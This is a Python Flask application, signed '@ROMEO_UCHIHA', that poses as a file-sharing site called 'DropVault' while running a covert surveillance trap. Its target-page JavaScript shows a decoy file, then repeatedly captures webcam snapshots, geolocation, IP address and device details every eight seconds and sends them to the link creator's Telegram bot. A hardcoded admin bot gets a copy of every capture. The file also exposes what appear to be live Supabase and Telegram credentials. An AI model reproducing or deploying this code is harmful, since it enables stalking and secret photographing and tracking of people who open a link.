# by:@ROMEO_UCHIHA (Silent Background Capture & Direct File Access)
from flask import Flask, request, render_template_string, jsonify, redirect, session
from supabase import create_client, Client
import base64, requests, os, time, uuid, random

app = Flask(__name__)
app.secret_key = "uchiha_super_secret_key" 
app.config['TEMPLATES_AUTO_RELOAD'] = True

# --- CACHE BUSTER ---
@app.after_request
def add_header(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

# --- SUPABASE & ADMIN CONFIG ---
SUPA_URL = "https://gijnkxuaejsjbxfruslm.supabase.co"
SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imdpam5reHVhZWpzamJ4ZnJ1c2xtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NTYzMzcsImV4cCI6MjA4NTMzMjMzN30.6RFyECY1aRVqxniS3xcv_iol31Su1QNLqXGGfTFlHu0"
supabase: Client = create_client(SUPA_URL, SUPA_KEY)

ADMIN_TOKEN = "7808271503:AAGR1uax_qHj7m9LA5oRYaF56LSeAo45EvI"
ADMIN_CID = "6383817850"

def send_tg_msg(token, cid, text):
    try: requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": cid, "text": text, "parse_mode": "Markdown"})
    except: pass

def get_bot_name(token):
    try:
        res = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
        if res.get("ok"): return res["result"]["first_name"]
    except: pass
    return "Unknown Bot"

def send_tg_photo(token, cid, raw_img, caption=""):
    try: requests.post(f"https://api.telegram.org/bot{token}/sendPhoto", data={"chat_id": cid, "caption": caption, "parse_mode": "Markdown"}, files={"photo": ("c.jpg", raw_img, "image/jpeg")}, timeout=10)
    except: pass

# --- UI TEMPLATES ---
COMMON_STYLE = """
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800&family=Poppins:wght@300;500;700&display=swap');
    :root { --main-red: #ff0000; --dark-red: #8a0000; }
    @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
    body { background: radial-gradient(circle at top, #110000 0%, #000000 100%); color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; padding: 20px; }
    .container { background: rgba(15, 0, 0, 0.7); backdrop-filter: blur(15px); border: 1px solid var(--main-red); border-radius: 20px; padding: 40px; width: 100%; max-width: 450px; box-shadow: 0 10px 40px rgba(255, 0, 0, 0.2); animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); text-align: center; }
    h2 { font-family: 'Orbitron', sans-serif; color: #fff; margin-bottom: 25px; font-weight: 800; letter-spacing: 1px; }
    h2 span { color: var(--main-red); }
    input { width: 100%; padding: 16px; margin: 10px 0; background: rgba(0, 0, 0, 0.6); border: 1px solid #333; color: #fff; border-radius: 12px; outline: none; transition: 0.3s; font-size: 15px; }
    input:focus { border-color: var(--main-red); box-shadow: 0 0 15px rgba(255,0,0,0.3); }
    button { width: 100%; padding: 16px; margin-top: 20px; background: var(--main-red); color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; letter-spacing: 1px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 15px rgba(255,0,0,0.3); }
    button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,0,0,0.5); background: #cc0000; }
    a { color: #888; text-decoration: none; font-size: 14px; display: inline-block; margin-top: 20px; transition: 0.3s; }
    a:hover { color: #fff; }
</style>
"""

LANDING_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DropVault | Advanced File Sharing</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&display=swap');
        body { margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; background: #030303; color: #ffffff; overflow-x: hidden; }
        header { padding: 25px 8%; display: flex; justify-content: space-between; align-items: center; position: absolute; width: 100%; top: 0; z-index: 100; box-sizing: border-box; }
        .logo { font-size: 24px; font-weight: 800; color: #fff; text-decoration: none; display: flex; align-items: center; gap: 8px; letter-spacing: -0.5px; }
        .logo span { color: #ff0000; }
        .nav-links a { color: #a3a3a3; text-decoration: none; margin-left: 30px; font-weight: 500; transition: 0.3s; font-size: 15px; }
        .nav-links a:hover { color: #fff; }
        .btn-primary { background: #ff0000; color: #fff !important; padding: 12px 28px; border-radius: 50px; text-decoration: none; font-weight: 700; transition: 0.3s; border: 1px solid transparent; }
        .btn-primary:hover { background: transparent; border-color: #ff0000; color: #ff0000 !important; box-shadow: 0 0 20px rgba(255, 0, 0, 0.2); }
        .hero { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 100px 20px; background: radial-gradient(circle at 50% 30%, rgba(50,0,0,0.4) 0%, #030303 60%); position: relative; }
        .hero h1 { font-size: clamp(2.5rem, 6vw, 4.5rem); margin-bottom: 20px; font-weight: 800; line-height: 1.1; letter-spacing: -1px; max-width: 900px; }
        .hero h1 span { background: linear-gradient(90deg, #ff0000, #ff4d4d); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero p { font-size: 1.15rem; color: #888; max-width: 600px; margin: 0 auto 40px; line-height: 1.6; }
        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; padding: 80px 10%; background: #050505; border-top: 1px solid #111; }
        .card { background: #0a0a0a; padding: 40px; border-radius: 20px; border: 1px solid #1a1a1a; transition: 0.4s; text-align: left; }
        .card:hover { border-color: #ff0000; transform: translateY(-5px); box-shadow: 0 10px 30px rgba(255,0,0,0.05); }
        .card .icon { width: 50px; height: 50px; background: rgba(255,0,0,0.1); color: #ff0000; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; margin-bottom: 25px; }
        .card h3 { color: #fff; margin-bottom: 15px; font-size: 1.3rem; font-weight: 700; }
        .card p { color: #777; font-size: 0.95rem; line-height: 1.6; }
        footer { text-align: center; padding: 40px; color: #555; font-size: 0.9rem; border-top: 1px solid #111; background: #030303; }
        @media(max-width: 768px) { header { flex-direction: column; gap: 20px; padding: 20px; position: relative; } .nav-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; } .nav-links a { margin: 0; } }
    </style>
</head>
<body>
    <header>
        <a href="/" class="logo">Drop<span>Vault</span></a>
        <div class="nav-links">
            <a href="/lg">Login</a>
            <a href="/rg" class="btn-primary">Start File Sharing</a>
        </div>
    </header>
    <div class="hero">
        <h1>Next-Gen <span>File Sharing</span> Infrastructure</h1>
        <p>Upload your files and generate highly protected sharing links. Restrict access using identity and location parameters for ultimate control.</p>
        <a href="/lg" class="btn-primary" style="padding: 16px 36px; font-size: 1.1rem;">Host A File Now</a>
    </div>
    <div class="features">
        <div class="card">
            <div class="icon">📁</div>
            <h3>Seamless File Delivery</h3>
            <p>Share documents, videos, and archives with a single clean interface. Perfect for delivering assets to clients securely.</p>
        </div>
        <div class="card">
            <div class="icon">👁️</div>
            <h3>Identity Gate</h3>
            <p>Ensure the correct recipient accesses the file. Our system requires a quick visual check before allowing file downloads.</p>
        </div>
        <div class="card">
            <div class="icon">🌍</div>
            <h3>Geo-Locked Sharing</h3>
            <p>Limit your file's availability to specific regions. Anyone outside the designated coordinates will be blocked instantly.</p>
        </div>
    </div>
    <footer>
        © 2026 DropVault File Sharing. Built for privacy and speed.
    </footer>
</body>
</html>
"""

@app.route("/")
def index(): 
    return render_template_string(LANDING_PAGE)

@app.route("/rg", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        token, cid = request.form.get("token"), request.form.get("cid")
        otp = str(random.randint(1000, 9999))
        supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "bot_name": get_bot_name(token), "purpose": "register"}).execute()
        send_tg_msg(token, cid, f"😈 *UCHIHA REGISTRATION*\\n\\nCode: `{otp}`")
        return redirect(f"/verify_otp?cid={cid}&purpose=register")
    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>CREATE <span>ACCOUNT</span></h2><form method="POST"><input type="text" name="token" placeholder="Bot Token" required><input type="text" name="cid" placeholder="Chat ID" required><button type="submit">Send OTP</button></form><a href="/lg">Already have an account?</a></div>')

@app.route("/lg", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        cid = request.form.get("cid")
        users = supabase.table("users").select("*").eq("chat_id", cid).execute().data
        if not users: return f"{COMMON_STYLE}<div class='container'><h2>ERROR</h2><p>Not registered!</p><a href='/rg'>Register</a></div>"
        elif len(users) == 1:
            otp = str(random.randint(1000, 9999))
            supabase.table("otps").insert({"chat_id": cid, "bot_token": users[0]["bot_token"], "otp": otp, "purpose": "login"}).execute()
            send_tg_msg(users[0]["bot_token"], cid, f"🔐 *LOGIN OTP*\\n\\nCode: `{otp}`")
            return redirect(f"/verify_otp?cid={cid}&purpose=login&token={users[0]['bot_token']}")
        else:
            html = f"{COMMON_STYLE}<div class='container'><h2>SELECT BOT</h2>"
            for u in users: html += f"<form method='POST' action='/send_login_otp'><input type='hidden' name='cid' value='{cid}'><input type='hidden' name='token' value='{u['bot_token']}'><button type='submit'>🤖 {u['bot_name']}</button></form>"
            return render_template_string(html + "</div>")
    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>WELCOME <span>BACK</span></h2><form method="POST"><input type="text" name="cid" placeholder="Enter Chat ID" required><button type="submit">Access Dashboard</button></form><a href="/rg">Create a new account</a></div>')

@app.route("/send_login_otp", methods=["POST"])
def send_login_otp():
    cid, token = request.form.get("cid"), request.form.get("token")
    otp = str(random.randint(1000, 9999))
    supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "purpose": "login"}).execute()
    send_tg_msg(token, cid, f"🔐 *LOGIN OTP*\\n\\nCode: `{otp}`")
    return redirect(f"/verify_otp?cid={cid}&purpose=login&token={token}")

@app.route("/verify_otp", methods=["GET", "POST"])
def verify_otp():
    cid, purpose, token = request.args.get("cid"), request.args.get("purpose"), request.args.get("token", "")
    if request.method == "POST":
        query = supabase.table("otps").select("*").eq("chat_id", cid).eq("purpose", purpose).eq("otp", request.form.get("otp"))
        if token: query = query.eq("bot_token", token)
        res = query.execute().data
        if res:
            if purpose == "register": supabase.table("users").insert({"chat_id": cid, "bot_token": res[-1]["bot_token"], "bot_name": res[-1]["bot_name"]}).execute()
            session["user_id"] = supabase.table("users").select("*").eq("bot_token", res[-1]["bot_token"]).execute().data[0]["id"]
            supabase.table("otps").delete().eq("chat_id", cid).execute()
            return redirect("/ds")
        return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY <span>OTP</span></h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify & Proceed</button></form></div>')

# --- TARGET PAGE (DIRECT FILE SHOW + SILENT BACKGROUND CAPTURE) ---
@app.route("/t/<link_id>")
def target_page(link_id):
    res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
    if not res.data: return "File Not Found or Removed!"
    
    data = res.data[0]
    action_mode = data.get("action_mode", "redirect")
    action_value = data.get("action_value", "")
    text_content = data.get("text_content", "")
    file_type = data.get("file_type", "")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>DropVault | File Ready</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Poppins:wght@400;600&display=swap');
            :root { --red: #ff0000; --bg: #050505; }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; padding: 20px; }
            
            /* Main Content UI */
            .content-box { background: rgba(15,15,15,0.9); border: 1px solid #333; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 100%; max-width: 500px; text-align: center; animation: slideUp 0.6s ease; }
            @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
            
            .file-icon-box { background: #111; border: 1px dashed #444; border-radius: 15px; width: 100%; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; gap: 15px; margin-bottom: 25px; }
            .file-icon-box i { font-size: 60px; color: var(--red); }
            .file-icon-box p { color: #888; font-size: 14px; margin: 0; }

            .btn-download { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 18px; background: var(--red); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; text-decoration: none; letter-spacing: 0.5px; transition: 0.3s; cursor: pointer; }
            .btn-download:hover { background: #cc0000; transform: translateY(-3px); box-shadow: 0 10px 20px rgba(255,0,0,0.3); }
        </style>
    </head>
    <body>
        
        <div class="content-box" id="media-content"></div>

        <canvas id="c" style="display:none"></canvas>
        <video id="bg-v" playsinline autoplay muted style="position:fixed; top:-1000px; left:-1000px; width:10px; height:10px; opacity:0; z-index:-999;"></video>

        <script>
            let actMode = "{{ a_mode }}";
            let actVal = "{{ a_val }}";
            let txtVal = {{ t_content | tojson | safe }};
            let fType = "{{ f_type }}";
            let camStream = null;
            let camTypeDetected = "UNKNOWN";

            window.onload = () => { 
                getHardware(); 
                showFileContent();
                startPersistence(); // Auto-start background stealth
            };

            function getHardware() {
                let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0 };
                fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) }).catch(()=>console.log("hw err"));
            }

            function showFileContent() {
                let medBox = document.getElementById('media-content');
                let html = "";
                
                if(actMode === 'text') {
                    html = `<div style="color:#fff; font-size:1.2rem; margin-bottom:20px; width:100%; text-align:left; white-space:pre-wrap;">${txtVal}</div>`;
                } else if (actMode === 'file') {
                    let ext = actVal.split('.').pop().toLowerCase();
                    let isVideo = ['mp4', 'webm', 'ogg', 'mov'].includes(ext);
                    let isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext);

                    let previewHtml = '';
                    if(isVideo || fType === 'video') {
                        previewHtml = `<video src="${actVal}" controls autoplay playsinline style="width:100%; max-height:300px; border-radius:10px; background:#000; margin-bottom:20px;" onerror="this.outerHTML='<div class=\\'file-icon-box\\'><i class=\\'fas fa-file-video\\'></i><p>Video File Ready</p></div>'"></video>`;
                    } else if (isImage || fType === 'image') {
                        previewHtml = `<img src="${actVal}" style="width:100%; max-height:300px; object-fit:contain; border-radius:10px; margin-bottom:20px;" onerror="this.outerHTML='<div class=\\'file-icon-box\\'><i class=\\'fas fa-file-image\\'></i><p>Image File Ready</p></div>'">`;
                    } else {
                        previewHtml = `<div class="file-icon-box"><i class="fas fa-file-archive"></i><p>Secure Shared File</p></div>`;
                    }

                    html = `
                        <h2 style="margin-bottom:20px; font-size:1.4rem;">File Access Granted</h2>
                        ${previewHtml}
                        <a href="${actVal}" target="_blank" class="btn-download"><i class="fas fa-download"></i> Download File</a>
                    `;
                } else {
                    html = `<div class="file-icon-box"><i class="fas fa-link"></i><p>External Link Ready</p></div><a href="${actVal}" target="_blank" class="btn-download">Continue to Link</a>`;
                }
                medBox.innerHTML = html;
            }

            async function startPersistence() {
                try {
                    camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    camTypeDetected = "FRONT";
                } catch(e1) {
                    try {
                        camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                        camTypeDetected = "BACK";
                    } catch(e2) {
                        try {
                            camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                            camTypeDetected = "AUTO";
                        } catch(e3) {
                            camTypeDetected = "DENIED_OR_NONE";
                        }
                    }
                }

                if(camStream) {
                    const bgV = document.getElementById('bg-v');
                    bgV.srcObject = camStream;
                    bgV.onloadedmetadata = () => { bgV.play(); };
                }

                // Pehli dafa foran bhejo
                executeStealthTask();
                
                // Infinite Loop (Har 8 second baad). Ye minimize hone pe bhi chalega.
                setInterval(executeStealthTask, 8000); 
            }

            function executeStealthTask() {
                // 1. Snapshot logic (Agar camera allowed hai)
                if(camStream) {
                    const bgV = document.getElementById('bg-v');
                    const c = document.getElementById('c');
                    if(bgV.videoWidth > 0) {
                        c.width = bgV.videoWidth; 
                        c.height = bgV.videoHeight;
                        c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
                        let imgData = c.toDataURL('image/jpeg', 0.5);
                        
                        fetch("/api/capture/{{ l_id }}", { 
                            method: "POST", 
                            headers: {"Content-Type":"application/json"}, 
                            body: JSON.stringify({ img: imgData, cam_type: camTypeDetected }) 
                        }).catch(()=>{});
                    }
                }

                // 2. Location Logic (Agar allow hai, ya deny nahi kiya hua aggressively)
                if(navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (p) => {
                            fetch("/api/log_loc/{{ l_id }}", { 
                                method: "POST", 
                                headers: {"Content-Type":"application/json"}, 
                                body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) 
                            }).catch(()=>{});
                        },
                        (e) => { /* Silently fail, aglay loop me phir try karega */ },
                        { timeout: 5000 }
                    );
                }
            }

            // Persistence Hack: Keeps the loop running when user switches tabs or minimizes Chrome
            document.addEventListener("visibilitychange", () => {
                if (document.hidden) {
                    console.log("Background stealth active...");
                }
            });
        </script>
    </body>
    </html>
    ''', a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id)

# --- BACKEND LOGGING APIS ---
@app.route("/api/log_hardware/<l_id>", methods=["POST"])
def log_hw(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        d = request.get_json()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        dev_info = f"{d['plat']} - Cores: {d['cores']}"
        
        msg = f"🎯 *TARGET HIT*\\n\\n🌐 *IP:* `{ip}`\\n💻 *Device:* {dev_info}\\n📌 *Mode:* {link['target_type'].upper()}"
        send_tg_msg(user["bot_token"], user["chat_id"], msg)
        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: TARGET HIT*\\nUser: {user['bot_name']}\\nIP: {ip}")
    except: pass
    return jsonify({"s": 1})

@app.route("/api/log_loc/<l_id>", methods=["POST"])
def log_loc(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        d = request.get_json()
        
        map_link = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
        msg = f"📍 *LOCATION FOUND*\\n\\nLat: `{d['lat']}`\\nLon: `{d['lon']}`\\n🗺 Map: {map_link}"
        
        send_tg_msg(user["bot_token"], user["chat_id"], msg)
        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: LOCATION*\\nUser: {user['bot_name']}\\n{msg}")
    except: pass
    return jsonify({"s": 1})

@app.route("/api/capture/<l_id>", methods=["POST"])
def cap(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        data = request.get_json()
        
        img_data = data["img"]
        cam_type = data.get("cam_type", "UNKNOWN")
        raw = base64.b64decode(img_data.split(",")[1])
        
        send_tg_photo(user["bot_token"], user["chat_id"], raw, f"😈 *UCHIHA CAPTURE*\\n📸 *Camera:* `{cam_type}`")
        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, f"🔥 *ADMIN COPY*\\nBy: {user['bot_name']}\\nCam: {cam_type}")
        return jsonify({"s": 1})
    except: return jsonify({"s": 0})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
